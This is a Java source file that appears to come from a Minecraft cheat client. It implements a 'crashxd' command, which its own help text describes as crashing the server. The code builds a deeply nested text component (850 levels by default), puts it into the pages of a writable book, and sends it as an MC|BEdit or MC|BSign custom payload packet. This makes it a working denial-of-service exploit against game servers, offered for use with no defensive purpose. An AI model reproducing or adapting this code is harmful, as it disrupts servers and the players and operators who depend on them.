package net.augustus.commands.impl;

import net.augustus.commands.Command;
import io.netty.buffer.Unpooled;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomStringUtils;

public class CrashCommand extends Command {

   public CrashCommand() {
      super("crashxd");
   }

   public void commandAction(String[] args, String rawMessage) {
      int n = 850;
      if (args.length > 1) {
         try {
            n = Integer.parseInt(args[1]);
         } catch (Exception e) {
            this.sendChat("§7" + this.getCommand() + " [§2Strength (default 850)§7]");
            return;
         }
      }

      StringBuilder sb = new StringBuilder();
      sb.append("{");

      for (int i = 0; i < n; i++) {
         sb.append("extra:[{");
      }

      for (int j = 0; j < n; j++) {
         sb.append("text:a}],");
      }

      sb.append("text:a}");
      ItemStack stack = new ItemStack(Items.writable_book);
      NBTTagCompound tag = new NBTTagCompound();
      NBTTagList tagList = new NBTTagList();

      for (int k = 0; k < 2; k++) {
         tagList.appendTag(new NBTTagString(sb.toString()));
      }

      tag.setString("author", RandomStringUtils.random(20));
      tag.setString("title", RandomStringUtils.random(20));
      tag.setByte("resolved", (byte)1);
      tag.setTag("pages", tagList);
      stack.setTagCompound(tag);
      PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
      buf.writeItemStackToBuffer(stack);
      String str3;
      if (Math.random() > 0.5) {
         str3 = "MC|BEdit";
      } else {
         short s = 21851;
         str3 = "MC|BSign";
      }

      String str4 = str3;
      mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload(str4, buf));
      this.sendChat("XDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD");
   }

   public void helpMessage() {
      this.sendChat("§c" + this.getCommand() + "§7 (Crashes the server)");
   }

}
